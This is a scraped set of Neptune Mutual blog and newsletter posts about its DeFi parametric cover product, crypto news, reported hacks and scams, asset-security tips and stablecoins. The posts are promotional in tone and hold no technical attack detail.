Including the passionate protocol developers behind our favourite CeFi, DeFi, and Metaverse projects.</p><p>In the words of our CEO, Binod Nirvan:</p><p><em><em>“We are really excited to launch the Neptune Mutual product on the Ropsten testnet. Obviously it will be the first opportunity for our community to try out the Neptune Mutual solution that we have been working hard to develop. The testnet is very important for a number of reasons:</em></em></p><ol><li><strong><strong><em><em>Feedback.</em></em></strong></strong><em><em> It provides us the opportunity to receive and listen to feedback about the product from our community. We have gamified the testnet launch in a way that specifically encourages participants to leave feedback.</em></em></li><li><strong><strong><em><em>Engagement. </em></em></strong></strong><em><em>Community is at the core of Neptune Mutual. It is the Neptune Mutual community that will validate whether an incident has triggered the parameters of the cover policy of a dedicated cover pool or not. It is the community that provides liquidity to the dedicated cover pools created in the Neptune Mutual marketplace. And of course, it is the community that will choose what protection they choose to buy from the different cover policies created within the Neptune Mutual marketplace. So using the testnet as a vehicle to build understanding, interest and engagement in our community is vitally important.</em></em></li><li><strong><strong><em><em>Perception.</em></em></strong></strong><em><em> We hope that the launch of Neptune Mutual testnet is the starting point of a movement towards more widespread protection of digital assets. There is a perception that protection in its current form is unreliable, slow, costly and complicated (particularly in relation to the all-important matter of what is included or excluded in the small print). We hope that our community will enjoy helping us optimise and improve our solution which we believe is reliable, fast, competitively priced and simple.”</em></em></li></ol><hr><h3 id="about-us">About Us</h3><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

These actions helped us grow the 5,800 Twitter followers we had at the beginning of February to nearly 25,000 at the end of February. In the same time period, the Discord community nearly quadrupled to 2,400 members, while the subscribers in Telegram channel grew by almost ten times to reach 11,000 users. The marketing team has many new initiatives in the pipeline both to grow our community as well as increase engagement so keep following us.</p><h2 id="recent-news">Recent News</h2><p>After months of meticulous planning and development we announced the date of the launch of our protocol on the testnet: Thursday, March 10th. The functionality of the application will progressively be opened-up over the first three weeks, starting with purchasing cover policies. We have gamified the application by creating a leaderboard that will track the activity of user wallets interacting with the testnet and automatically allocate points to those who complete actions. We will be publishing to our Medium account and YouTube channel content that will help users understand how to use our parametric cover solution as well as how to gain points and earn rewards and progress up our Hall of Fame Leaderboard.</p><h2 id="platform-update">Platform Update</h2><p>We launched our brand new website at <a href="http://neptunemutual.com/" rel="noopener ugc nofollow">neptunemutual.com</a>, much to the delight of our members and the wider community.

We really appreciate the community’s reaction to our new design which has been overwhelmingly positive.</p><h2 id="protocol-update">Protocol Update</h2><p>The development team is at full stretch, working hard to ensure the successful launch of the testnet protocol.

Sports have also been gaining traction in recent months, with Deloitte’s Technology, Media, and Telecommunications (TMT) estimating a global transaction total of over $2 billion in this sector by the end of 2022.</p><h2 id="blockchain-hacks">Blockchain Hacks</h2><p>Around $1.4 million in NFTs were stolen from Arbritrum’s main NFT marketplace on March 3rd. The hacks were made feasible through a logic flaw in one of the marketplace’s functionalities, which allowed for the free purchase of existing listings. Treasure DAO has encouraged users to delist their NFTs, and the hunt for the anonymous hacker has begun, with reports that just a small portion of the stolen assets have been returned to the platform.</p><h2 id="metaverse-and-nfts">Metaverse, and NFTs</h2><p>South Korea has become the first country to express interest in developing a national project in the Metaverse field, dubbed the “Expanded Virtual World.” Through an official statement, South Korea’s Ministry of ICT, Science, and Future Planning pledged $186.7 million to create a broad metaverse ecosystem to support the growth of digital content and corporate growth within the country, as well as use it as a platform for expanding the virtual industrial growth of cities, education, and media.</p><p>During a keynote speech at Mobile World Congress, Joan Laporta, President of FC Barcelona, highlighted the club’s intention to amplify its growth through technology by establishing a digital future. Blaugrana’s strategy includes creating their own metaverse, cryptocurrency, and NFTs collection, all of which will undoubtedly bring their fans closer to the team.</p><p>CVS Health has filed trademarks for NFT and Metaverse, joining the large list of retailers like Nike and Walmart. The US-based healthcare conglomerate has filed a trademark registration in the metaverse, citing prescription pharmaceuticals, cosmetics, and personal care goods, as well as “crypto-collectibles” like NFTs, establishing themselves as the first pharmacy in the nascent virtual world.</p><p>Billie Eilish is the newest celebrity to jump into the NFT bandwagon. The 20-year-old American singer-songwriter, through her company Lash Music LLC, has filed to trademark her brand in relation to NFTs, virtual currency, and digital collectibles, including downloadable video game software, virtual goods, in-game resources, and currencies related to virtual worlds.</p><p>Katy Perry, another international pop superstar, debuted a second collection of NFTs on Theta Network on March 4th, following the success of her first collection, which debuted in December of last year. The collection drop was a reference to Perry’s “Roulette” performance on the 2017–2018 Witness Tour.</p><p>Solana-based NFT marketplace Snowcrash has announced that Sony Music and Universal Music Group have partnered to release NFT collections by Bob Dylan and Miles Davis later this year. According to a press release, the partnership will bring together diverse segments of technology, the creative arts, and digital innovation.</p><p>Tencent, a Chinese multinational technology and video game company, has also filed a patent application with the Chinese National Intellectual Property Administration for virtual concerts (CNIPA).</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

This cutting-edge technology has piqued the interest of both the public and the government, resulting in a domino effect in fields like art, fashion, and design. Thus, NFTs and the metaverse has continued to become a mainstream topic of conversation because of the advantages it provides in terms of global access, decentralised nature, and useability.</p><h3 id="blockchain-hacks">Blockchain Hacks</h3><p>The number of smart contract vulnerabilities, scams, rug pulls, and security exploits have equally increased with the growth in the DeFi industry. Investors and liquidity providers lose money as a result of technical defects in the platform, a lack of security audits, or low morale amongst market movers. In a similar event, Web3Memes (W3M), a new memecoin developed on the Binance Smart Chain, was rugged with 625 Binance Coins (BNB) worth $237,000. When investors had already invested their money into memecoin, its liquidity pools were depleted approximately five hours after its public release.</p><h3 id="metaverse-and-nfts">Metaverse, and NFTs</h3><p>Animoca Brands has partnered with a South Korean entertainment company, Cube Entertainment to create the music metaverse AniCube. The joint venture will enable the benefits of NFTs, in particular intellectual property rights, to be available to artists and their fans in global marketplaces. Digital sound sources, albums, portraits, and avatars of K-pop artists under the management’s wing will all be included in future NFT drops.</p><p>Binance has also partnered with SM Brand Marketing, a subsidiary of SM Entertainment in South Korea. The collaboration with the world’s largest digital asset platform will enable the latter to establish an eco-fund and a global Play-to-Create (P2C) NFT ecosystem, which will allow users to recreate IP-based content in the form of music, dance, games, and merchandise.</p><p>FTX, another cryptocurrency juggernaut, has introduced an “NFT as a Service” for mainstream gaming studios to include crypto-collectibles in their titles. This solution will allow companies to launch digital tokens for gamers and will support NFTs integration alongside other blockchain-powered collectibles.</p><p>NFT adoption has also been on a massive rise in the land of the rising sun. Rakuten has announced the launch of its own NFT trading platform, Rakuten NFT. The NFT marketplace from the Japanese e-commerce and online retailing giant will also allow intellectual property owners to issue and sell NFTs through their own websites. In other headlines, Mitsubishi UFG, the world’s second-largest bank holding company, is releasing its own cryptocurrency wallet that will be capable of storing and using blockchain-powered digital assets and NFTs.</p><p>Manchester City is the latest addition to enter the Metaverse space, following Manchester United’s collaboration with Tezos as their technology partner. The English Premier League’s reigning champions have partnered with Sony Corporation to create a virtual replica of Etihad Stadium, making it the first soccer arena to exist in virtual reality.</p><p>Jupiter Meta has launched India’s first fully curated NFT marketplace. The digital marketplace will concentrate on music, cinema, and gaming, allowing consumers to get the most out of their time in the metaverse. Following this launch, The Advertising Standards Council of India, or ASCI, has established a complete guideline for promotions of digital assets and crypto enterprises, including NFTs and exchanges. The ASCI standards, which will take effect on April 1, 2022, would require crypto firms to include a disclaimer prominently in any media ads they may run, and all past ads from advertisers should be removed from the public domain unless the new disclaimer is included.</p><p>In addition, Infosys has announced the launch of Metaverse Foundry. With over 100 ready-to-use templates and use cases, the Indian IT multinational company’s new business division promises to simplify and accelerate an enterprise’s ability to use emerging technologies and offer metaverse products and services.</p><hr><h3 id="about-us">About Us</h3><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

Bitcoin’s market growth rate can now even be seen alongside those of the S&amp;P 500, Nasdaq, and Dow, in leading business newsletters.</p><p>Social media platforms are also blowing up with conversations on NFT ownership, the metaverse, and Web3. Central banks and governments have also acknowledged the blockchain industry, in one way or another.

Because if left unchecked, our personal belongings can either get lost or stolen. In crypto, this same warning applies.</p><p>Don’t get us wrong, the blockchain as a technology is absolutely safe and secure. However, when the use of the blockchain falls short in eliminating vulnerabilities, cybercriminals can take advantage of it.</p><p>Protection and security come with the territory of digital asset ownership. Crypto exploits tend to target unsecured digital assets and DeFi projects in development infancy.</p><p>For cybercriminals, digital assets like cryptocurrency funds and NFTs are nothing more than just a smart contract vulnerability or two to break. Some use intricate scams to use personal information and get through barriers. In other words, <a href="https://blog.neptunemutual.com/defi-crime-data-review-and-tips-on-digital-asset-security" rel="follow">crypto crime can be creative.</a></p><p>In order for DeFi and the entire crypto market to move forward, digital asset protection and crypto market risk mitigation should be ten steps ahead, if not more, against crypto crime.</p><p>The fast-growing innovation and development in DeFi protocols, projects, and super practical features. Similar growth in risk reduction and management should also be encouraged. If possible, even catalysed.</p><p>In this relatively new industry, it’s crucial that each participant in decentralised finance and the blockchain should give equal importance to ownership and security.</p><p>This brings us to the important question of…</p><p>How can everyday investors and founders protect their assets and projects, respectively?</p><h2 id="how-to-secure-crypto-digital-assets">How to Secure Crypto Digital Assets</h2><p>Let’s begin with discussing digital asset security from an everyday user and/or retail investor’s perspective.</p><h3 id="research-before-anything-else">Research Before Anything Else</h3><p>Like every investment, DeFi investors should always do their own research. For beginners, this includes understanding the basics of decentralised finance and the blockchain industry as well as the crypto market’s behaviour.</p><p>Long-time DeFi investors are encouraged to use their experience and expertise in researching prospect crypto projects and tokens. Check out the legitimacy of the project by exploring its online presence, website, and social media activity. Don’t forget to get to know the team behind the project or protocol. And much more that details what phase the project is currently in at present.</p><h3 id="detect-and-prevent">Detect and Prevent</h3><p>Most crypto projects and DeFi protocols run on smart contracts, collections of code that perform a specific sequence of instructions that interact with the blockchain.</p><p>Smart contracts are fundamental to each project. They are the reason why protocols are innovative and progressive and pack a lot of practical features. Unfortunately, loopholes and vulnerabilities in smart contracts can be entry points for exploitation.</p><p>This is why it is important for one to look into and assess the development of a project’s smart contract code.</p><p>Look out for dApps and protocols that don’t publicly share their code or aren’t active in resolving security issues in their community. Take a quick peek into their Github repositories.</p><p>Identify the practicality of the project. Review their recent developments and explore what their future goals are. Serious DeFi projects continuously update their platform to improve UX, design, and most of all, security.</p><p>Legitimate DeFi projects go through intensive smart contract audits. Audits make projects more secure, risk aversive, and ready to launch in the market.</p><p>Bottom line: Find out if the DeFi project or protocol you plan to invest in is legitimate, backed, and transparent.</p><h3 id="keep-your-personal-information-safe">Keep Your Personal Information Safe</h3><p>Not all things have to be transparent though, especially your personal information. Whether you’re a frequent user of decentralised finance or just learning your way into it, it is essential to have strong information security in order to keep your digital assets protected.</p><p>Avoid storing your passwords in the cloud. Opt for a reliable password manager instead or the good ol’ write it down in the notebook on your desk.</p><h3 id="get-covered">Get Covered</h3><p>If all else fails, you can always get covered. Risk prevention and mitigation go hand in hand with each other. With most of the aforementioned ways to secure your digital assets being prevention, it’s time we talk about how one can manage those risks.</p><p>DeFi protocol users and investors can reduce their crypto market risk exposure with parametric covers. Unlike traditional insurance, parametric covers don’t put policyholders in the situation of waiting for their claims to get approved. Parametric covers eliminate the need for individual claims assessments by instead, assessing the incident as a whole.</p><p>Since parametric covers only need to assess the event to resolve each claim, parametric covers are able to guarantee policyholders instant claims payouts. This way users and investors will no longer have to worry about their claim getting rejected ever again. <a href="https://blog.neptunemutual.com/parametric-cover-covering-the-basics" rel="follow">It’s actually pretty interesting to know how parametric covers work.</a></p><h2 id="how-to-protect-defi-protocols">How to Protect DeFi Protocols</h2><p>On a much larger scale, DeFi protocols can participate in developing their project’s ability to ensure risk prevention and mitigation for its users and investors.</p><h3 id="perform-full-unit-tests">Perform Full Unit Tests</h3><p>Unit tests are indispensable to every high-quality project testing. These tests help identify vulnerabilities in the smart contract before hackers can set their eyes on it. It is crucial that projects undergo constant and complete unit testing that doesn’t just cover major parts of the code. But, also unnoticed sections that may potentially have an exposed loophole in it.</p><h3 id="smart-contract-security-audits">Smart Contract Security Audits</h3><p>Sometimes after reviewing and testing the entire code, from each line to every method, class, and module, developers may not be able to guarantee a project’s smart contract is safe and secure. Security audits can help take the project’s level of security further. A security audit helps prevent hacking by identifying unpredictable smart contract vulnerabilities before a DeFi protocol’s launching. And if one audit doesn’t cut it, perform a secondary security audit.</p><h3 id="unique-coding">Unique Coding</h3><p>Copy-pasting is the bane of every successful work, especially in DeFi projects. Some pieces of another project’s code may fit into the copying protocol. However, it may never belong as some important lines of code may not work together or be compatible with the protocol. In programming, we call these logic errors. The smart contract may not function as intended.<a href="https://blog.neptunemutual.com/financial-protection-of-digital-assets-covering-the-basics" rel="follow"> Just like this copy-and-paste error.</a></p><h3 id="work-with-experienced-defi-developers">Work with Experienced DeFi Developers</h3><p>Expert blockchain developers and cybersecurity specialists are useful when it comes to developing a super-secure DeFi protocol. Many of their industry knowledge comes from years of “charging to experience.” Tons of smart contract errors and exploitable code could be detected even before a protocol launches.</p><p>It is important that you hire experienced DeFi developers that understand how to counter the most common and unpredictable smart contract vulnerabilities.</p><h3 id="community-support">Community Support</h3><p>A protocol is nothing without its community. With the support of your following audience, you can drive bug bounty and testing campaigns that motivate your users and investors to give feedback on their experience using your protocol. Incentivize their support with rewarding games and events.</p><p>You can also create parametric cover pools as well to garner community support through crowdfunding. Both of these will help DeFi protocols and projects build a confident investor community.</p><h2 id="why-defi-and-digital-asset-security-matters">Why DeFi and Digital Asset Security Matters</h2><p>As with anything valuable, digital assets need reliable security. Investors and owners should always prioritise security right after they acquire a certain digital asset.</p><p>Safeguard it according to best security practices and ensure your most valuable crypto investments don’t get taken away from you. Sometimes, prevention may not be enough. Thus, it is crucial to also keep risk mitigation in mind with the use of parametric covers which provide a reliable safety net to fall back on.</p><p>DeFi protocols should also prioritise the security of their projects. It is encouraged crypto platforms make an effort at ensuring their users and investors are safe and protected.</p><p>In order for DeFi to move forward, we, as a global community, should make a collective effort in making digital asset security a priority and relevant conversation.</p><hr><h2 id="about-us">About Us</h2><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: '<h3 id="how-parameter-based-covers-work">How parameter-based covers work</h3><p>Some losses are difficult to quantify. While it’s easy to quantify loss or damage to a car or the contents of a home, it’s not as straightforward when it comes to quantifying loss caused by agricultural and environmental disasters.</p><p>Hence why parametric covers exist.</p><p>A parametric cover is a type of cover that covers a policyholder against a specific incident or an incident of a specific magnitude.</p><p>So, how does it work?</p><p>Rather than paying a set amount for the magnitude of losses (covered by a traditional indemnity policy), parametric cover pays a set amount based on the magnitude of the event.</p><p>For example, a parametric policy could pay out a set amount if an earthquake of magnitude 5.0 or greater occurs. The contract for that policy would specify the amount of payment, the trigger parameters that determine whether or not the event has happened, and a third party responsible for verifying the status of the trigger parameters.</p><p>Some policies include a tier of third-party verifiers just in case the primary agency becomes incapacitated.</p><p>Trigger events depend on the nature of the parametric policy and can include environmental triggers such as wind speed and rainfall measurements, business-related triggers such as foot traffic, and so on. Examples of current parametric products include the <a href="https://www.ccrif.org/?language_content_entity=en" rel="noopener ugc nofollow">Caribbean Catastrophe Risk Insurance Facility</a> (CCRIF), the <a href="https://www.arc.int/" rel="noopener ugc nofollow">African Risk Capacity</a> (ARC), and the protection of coral reefs in the state of Quintana Roo in Mexico.</p><h3 id="what-makes-parametric-covers-unique">What makes parametric covers unique</h3><p>A key attribute of a parametric cover is its elimination of the claim adjustment process. There will no longer be a need for an adjuster to investigate the loss, interpret the policy wording, and apply the policy based on facts discovered in the investigation.</p><p>As long as the parameter was triggered, the parametric policy will initiate a payout. This makes claims money reach policyholders faster. Unlike standard indemnity contracts that can take months or years to payout.</p><p>The beauty behind a parametric cover contract is its ability to deliver payouts within a matter of days.</p><p>The policyholder also has an incentive to minimize their losses with a parametric cover since the amount of policy payment is unaffected by the total loss. This reduces the company’s exposure to the problem of moral hazard. This is where a person with cover takes greater risks than they normally would because they know their policy will pay out if something bad happens.</p><p>The risk of insurance fraud is also reduced because trigger events are usually large-scale and independently verified, and payment is standardized.</p><p>Parametric covers can also work alongside standard indemnity policies.</p><p>Those seeking parametric cover do need to understand that removing the link between losses incurred and payout means that careful attention should be given to the amount of cover that is taken.</p><p>It is important to ensure that there is a reasonable match between the payout of the policy and the potential losses that might be incurred if the parameters are triggered.</p><h3 id="traditional-insurance-in-the-blockchain-industry">Traditional insurance in the blockchain industry</h3><figure class="kg-card kg-image-card"><img src="https://blog.neptunemutual.com/content/images/2022/11/onchain-insurance.png" class="kg-image" alt loading="lazy" width="1400" height="788" srcset="https://blog.neptunemutual.com/content/images/size/w600/2022/11/onchain-insurance.png 600w, https://blog.neptunemutual.com/content/images/size/w1000/2022/11/onchain-insurance.png 1000w, https://blog.neptunemutual.com/content/images/2022/11/onchain-insurance.png 1400w" sizes="(min-width: 720px) 720px"></figure><p>So far we’ve looked at parametric cover in the physical world. Now, we come to examine how parametric cover protocols work in the blockchain industry.</p><p>The cryptocurrency ecosystem is still in its infancy. Participants face numerous risks including hacks of centralized exchanges and custodians, including exploits, and other forms of attack on decentralized protocols. Crimes like these can result in big financial losses for both service providers and consumers. For service providers, the drop in consumer confidence resulting from a hack or exploit can be more costly than the loss of funds themselves. Unfortunately, there are only a limited number of tools available to protect against such cybercrimes, some of which still need further development.</p><p>This may seem surprising given that decentralized finance (DeFi) has evolved into a robust, autonomous, and borderless financial ecosystem that provides disintermediated alternatives to core financial services including investing, borrowing, and trading. With attractive yield opportunities offered, the total value locked in DeFi protocols currently exceeds $230B across numerous popular blockchains.</p><p>The rapid growth of the DeFi ecosystem makes it crucial for users and platforms (exchanges and protocol teams) to manage the risk of hacks and exploits. However, only a handful of insurers are willing to tailor products that meet this demand, and insurance is still a very expensive option for providing financial protection.</p><p>As a result, not many exchanges have any insurance protection available. Only large platforms that have substantial financial resources can afford to reserve a certain percentage of profit to cover such risks. Many insurance protocols in the blockchain industry are focusing on DeFi, and it is perhaps surprising that in an industry that is well-known for its risks, all these insurance, and financial protection protocols combined have locked only $1.3B worth of assets, a tiny proportion of the overall assets within the DeFi space.</p><p>Most of the DeFi insurance solutions currently available are either discretionary or based on predictions (options). Some solutions require Know Your Customer (KYC) while others do not. However, nearly all protocols require that individual policyholders submit claims with a proof of loss, and await a centralized or third party jury to assess the nature and amount of loss for each claim before any payout can occur.</p><p>Backlogs and delays in approvals and payouts can be caused if large numbers of claims need to be processed at once. This cumbersome claims assessment process results in significant inefficiency. In addition, and arguably more importantly, in many cases less than half of policyholder claims that are submitted ever get approved.</p><p>One could argue that this low proportion of claim acceptance defeats the purpose of having insurance in the first place.</p><h3 id="the-risks-of-paying-for-discretionary-insurance">The risks of paying for discretionary insurance</h3><p>The big risk of discretionary insurance on the blockchain is that it’s not always clear what these policies actually cover. As they say, it pays to read the small print.</p><p>A surefire recipe for all-round dissatisfaction is a crypto hack, followed by an announcement from the insurer that the policyholders will not be able to claim a payout because the type of hack exploit was not covered by the terms of the policy.</p><p>The challenge of protecting consumers in a digital environment against a wide range of highly technical scenarios can potentially create a disconnect between the insured and the insurer.</p><p>Many insurance policies that one can take out to protect against hacks and exploits look quite similar, however, people need to be aware that there is a significant risk they won’t receive the payout they expect after a hack. A quick analysis of <a href="https://nexustracker.io/claims" rel="noopener ugc nofollow">Nexustracker</a>, which lists Nexus Mutual’s most recent claims, reveals that of the 95 most recent claims at the time of writing, 77 were denied and only 17 were accepted.</p><p>Scenarios where claims are denied and not paid out also put a protocol’s reputation at risk.</p><p>First, the lengthy insurance process causes uncertainty, frustration, and impatience in the community. Then, the investing community naturally expects action. But, they may quickly lose confidence if insurance claim assessments get rejected because of policy exclusions or discretionary rejections.</p><h3 id="how-neptune-mutual-parametric-cover-works">How Neptune Mutual parametric cover works</h3><p>Later this year, Neptune Mutual will be launching an alternative to discretionary insurance on the blockchain.</p><p>Neptune Mutual’s parametric covers will provide policyholders with protection against specific hacks or events on the blockchain.</p><p>To start with, Neptune Mutual selects high-quality cover creators; typically entities strongly linked to the CeFi/DeFi project being covered. The platform guides cover creators through the process of setting up a dedicated cover pool. The first step defines the parameters of the risks that the cover will protect against. Parameters need to be binary and there should be at least one specifying a minimum size of loss to the community.</p><p>Parametric cover policies are generally defined by only a few parameters, with a very limited number of exclusions (for example, the exclusion of deliberate or malicious action by the cover creator or protocol team).</p><p>After that, the floor and ceiling price of the cover policies offered by the cover pool are set and the next step is to attract liquidity providers. Liquidity providers benefit from a variety of revenue streams including the fees paid by cover policyholders. One of these revenue streams arises from the option to stake the Proof of Deposit (POD) that is provided when supplying liquidity to a cover pool.</p><p>To compensate and alleviate some of the risk taken by the liquidity providers, cover creators can provide a reassurance token that will re-capitalise a portion of the dedicated cover pool in the event an incident arises.</p><p>Dedicated cover pools provide a guaranteed payout to policyholders because:</p><ul><li>It is funded with stablecoin.</li><li>Neptune Mutual’s NPM token price does not impact liquidity or payouts.</li><li>Available cover pool liquidity is always higher than the total cover pool liability.</li><li>There is no individual claim assessment process. If an incident is validated, ALL policyholders can receive a payout.</li></ul><h3 id="what-problems-neptune-mutual%E2%80%99s-cover-solves">What problems Neptune Mutual’s cover solves</h3><p>From purchasing cover from a Neptune Mutual pool, reporting an incident, dispute resolution, to claims payout, everything is fully transparent and decentralized. Anybody can purchase a protection from Neptune Mutual cover pools without having to go through a complicated onboarding process. Most importantly, cover purchasers never have to worry about their claims not getting paid upon incident resolution.</p><p>The Neptune Mutual protocol is based on a parametric cover model that offers policyholders protection against financial loss resulting from a predefined set of parameters or events (also known as cover incidents). The policyholders pay a premium (also known as a policy fee) to get cover for a fixed duration and desired amount. As a result, faster claims payout becomes possible because a claim does not require any back and forth between the underwriters, claims assessors, loss adjusters, or any middlemen or centralized party.</p><p>There is no need for individual assessment of each claim or the accompanying proof of loss documents. Once resolution is reached in the cover incidents, the payout is validated for every policyholder. The payout amount does not change during the term length and the policyholders cannot file a claim exceeding the agreed upon amount.</p><h3 id="conclusion">Conclusion</h3><p>It’s easy to see how discretionary insurance can fail to live up to expectations when it comes to covering the risks of hacks and exploits. The claims assessment process is highly inefficient, and too few claims get approved. Fortunately, a fast and reliable solution for blockchain investment protection can be found in <a href="https://neptunemutual.com/" rel="noopener ugc nofollow">Neptune Mutual’s</a> parametric cover protocol.</p><hr><h3 id="about-us">About Us</h3><p>Neptune Mutual project safeguards the Ethereum community from cyber threats.

        html: '<p>Chainalysis, the blockchain data platform, shared their latest Crypto Crime Report for 2022, revealing surprising information about the state of crime in the digital finance industry.</p><p>As a DeFi protocol that values digital asset security and protection, we wanted to share our insights on bad actors in the DeFi space, along with tips on how investors and owners can keep their digital assets safe from these crypto exploits.</p><p>Understanding how to avoid and reduce risks in the crypto industry along with digital asset protection and security are just as important conversations as those in DeFi development, usage growth, and adoption.</p><h2 id="how-crime-piggybacks-on-defi-growth">How Crime Piggybacks on DeFi growth</h2><p>Evidently, adoption and usage of DeFi exponentially grow at an even faster rate. According to Chainalysis, from all the cryptocurrencies they’ve tracked, cryptocurrency’s total transaction volume grew to over $15 trillion in 2021 alone, 5 times more than in 2020. However, its massive growth has motivated criminals to take advantage of cryptocurrencies and decentralised finance.</p><p>Crypto crime hit a different kind of all-time high last year. In 2021, suspected illicit addresses have taken around $14 billion sourced from illegal activities, $7.8 billion more than in 2020. Riding on more than just the hype, cybercriminals piggyback on DeFi’s state of innovation and convenient functionality — exploiting people new to the market and the anonymity of decentralisation.</p><p>Three types of crypto crimes and exploits are prominent in the DeFi space: stolen funds, money laundering, and scams. Let’s go over each crypto crime and find out how one can get protected against them.</p><h2 id="stolen-funds">Stolen funds</h2><p>The majority of crypto crime comes from cryptocurrency and digital asset theft. Around $3.2 billion worth of cryptocurrency was stolen in 2021, 5 times more than was stolen in 2020. An estimated $2.2 billion of those stolen funds were taken from DeFi protocols. There is an increasing number of thefts associated with DeFi projects, a trend consistent with Chainalysis’ 2021 Crypto Crime report.</p><p>It’s unfortunate and alarming that amidst the expansion of DeFi functionality and its positive impact, the prevalence of stolen cryptocurrency funds continues. Because most of DeFi is built on emerging tech, cyber thieves and hackers exploit smart contract vulnerabilities to steal funds from protocols.</p><p>Let’s explore 2 easy ways a DeFi protocol user and/or investor can protect their digital assets from getting stolen.</p><p>Starting off with prevention and the classic yet evergreen crypto market advice: always do your own research. Since most cyber theft comes from the exploitation of vulnerabilities of smart contract codes, it’s important to assess whether or not a protocol is giving priority to cybersecurity and continuously developing smarter and less vulnerable smart contracts.</p><p>However, if all else fails, parametric covers can give not only users and investors but also project founders a reliable way to mitigate crypto market risks. In the case of a DeFi protocol getting hacked, parametric cover pools can ensure that policyholders can reduce the impact of risk on their finances, through guaranteed claims payouts crowdfunded by supporters and liquidity providers of the DeFi project.</p><p>Neptune Mutual gives users and investors a secure and convenient way to get protected with parametric covers. It also provides projects the chance to create crowdfunded cover pools. The beauty of parametric cover is its ability to eliminate the need for individual claims assessments by assessing the incident alone. Making claims less of a hassle for the investor. And making investor protection easier for the cover creator — the DeFi protocol or crypto platform.</p><h2 id="money-laundering">Money laundering</h2><p>Where there are stolen funds, there’s most likely laundered money. Usage of DeFi protocols saw the most growth in the laundering of illegally-sourced funds at 1,964%. Fortunately, money laundering takes a lesser proportion in the overall use of DeFi protocols than it did in 2020.</p><p>DeFi projects and protocols can protect their platforms from being channels for illicit money laundering activities by using data analytics that identify suspicious patterns to help weed out potential money launderers. Constant communication with authorities and communities can help projects stay informed about common MOs and transactions done by suspected cybercriminals.</p><h2 id="scams">Scams</h2><p>Many scams go on in the crypto market especially since most of the technology it’s built upon is relatively new.</p><p>In 2021, scams have stolen over $7.8 billion of cryptocurrency from victims. Almost $3 billion of this comes from rug pulls, a scamming exploit used by developers who pitch seemingly legitimate crypto projects and DeFi protocols. Rug pull scammers use the promise of growth potential from their barely-developed or half-baked projects to con investors into funding their project. A form of fraud, they then abandon the project and take off with the investment capital.</p><p>So, how can one avoid crypto scams like rug pulls?</p><p>One easy way to spot a crypto scam early on is to find out if the project has a code audit. A code audit acts as a verification process led by a reputable third-party organisation that inspects the DeFi project’s smart contract code and confirms the validity of the smart contract’s programming and the lack of any exploit that would give the developers a way to take off with investor funds.</p><p>Code audits can help both retail and institutional investors spot potentially fraudulent DeFi projects, along with helping them avoid the risk of getting scammed.</p><h2 id="crime-doesn%E2%80%99t-pay-%E2%80%94-even-in-crypto">Crime doesn’t pay — even in crypto</h2><p>It never does. Authorities all over the world are on a widespread crackdown on digital crime. Amidst the increasing number of illicit crypto activities, more and more cybercriminals are also getting discovered and apprehended. As a matter of fact, legitimate DeFi usage outpaces usage in crypto criminal activity. It is now much lower than ever before.</p><p>Reputable crypto institutions, investors, and communities like Fenbushi Capital, Animoca, Coinbase, OKEx, and Neptune Mutual are also working together towards bolstering crime prevention and risk mitigation in the DeFi industry.</p><p>Criminal whale addresses that hold around $10 billion worth of cryptocurrency are also being tracked and observed. These addresses have also been identified as related to the darknet economy and scamming exploits. This kind of information will be crucial to the success of the global crypto crime crackdown.</p><h2 id="takeaway">Takeaway</h2><p>DeFi is a hotspot for innovation. It continues to be an exciting aspect of the blockchain industry. Its rapid growth makes it an attractive ecosystem for investors, users, creators, and entrepreneurs alike to thrive as one community.</p><p>It is sad, however, that cybercriminals are taking advantage of the functionality of decentralised finance in ways that undermine confidence in the continued growth and adoption of DeFi.</p><p>It is important that every participant of the DeFi industry communicate and support each other in preventing crypto crime to thrive in the market. Impactful players in the DeFi space are encouraged to influence and lead significant changes in digital asset security and protection — in the hopes that decentralised finance and the overall crypto market doesn’t get associated with fraudulent and illicit projects as well as bad actors in digital finance.</p><p>As a member of the fast-growing DeFi community, the benefit of being part of such change through raising awareness, preventing potential exploits, and mitigating risks with parametric covers will resonate back to you in the long run.</p><hr><h2 id="about-us">About Us</h2><p><em>Neptune</em> Mutual project safeguards the Ethereum community from cyber threats. The protocol uses parametric cover as opposed to discretionary insurance. It has an easy and reliable on-chain claim process.

They resist most frequent low-to-high volume changes in the market, unlike their other more volatile cryptocurrency counterparts.</p><p><a href="https://blog.neptunemutual.com/creating-value-out-of-collaterals-how-do-stablecoins-remain-stable" rel="follow">There are four primary types of stablecoins.</a> Three of these types run on collateral-based systems that use fiat currencies, cryptocurrencies, and/or commodities to peg their stable values on. The fourth type of stablecoin uses a non-collateralized system that maintains price stability through the use of algorithms and smart contracts.</p><h2 id="why-defi-uses-stablecoins">Why DeFi Uses Stablecoins?</h2><p>Stablecoins are usually used to trade other cryptocurrencies and use decentralised financial services. Unlike centralised bank-issued fiat currencies, you can use stablecoins at any time on any given day wherever you are in the world without having to ask permission from a centralised body like banks or brokers to make a trade. In short, faster, unlimited, and easier access to financial services.</p><p>Built on blockchain technology, stablecoins also function together with smart contracts. They require no intermediaries to execute the smart contract. Instead, these contracts adhere to code written and agreed upon by both parties, creating transactions that traditional finance wouldn’t normally have possible.</p><p>From trading and transactions to lending and borrowing, stablecoins give investors, creators, and traders a unique and practical digital asset to do a new way of finance. One that is decentralised — DeFi.</p><h2 id="who-makes-stablecoins">Who Makes Stablecoins?</h2><p>So, how do stablecoins come into existence? How are they made into the blockchain?</p><p>Stablecoin providers start with identifying what type of stablecoin they’ll be developing.</p><p>Choosing from the aforementioned four types of stablecoins, stablecoin developers build stablecoins on either the use of collateral assets or programmed smart contracts.</p><p>If they use collateralised stablecoins, these stablecoin providers will have to maintain reserves of these collateral assets to back their value and supply. Yet, the uncertain risk of whether or not these providers have these collateral assets — remains.</p><p>After providers choose what type of stablecoin they’re going to develop, they then identify where and how they’re going to develop their stablecoin. Including how they’re going to maintain its liquidity and stability.</p><p>After technical and branding completion, stablecoin providers then integrate their stablecoins on the blockchain and launch them on their preferred exchanges.</p><p>In fact, anyone, even you, can create stablecoins.</p><p>But are stablecoins truly decentralised?</p><h2 id="are-stablecoins-decentralised">Are Stablecoins Decentralised?</h2><p>Yes and somewhat no. Stablecoins are built on the decentralised technology of the blockchain. This means no regulatory or central entity controls it including all stablecoin providers. However, some stablecoins peg their values 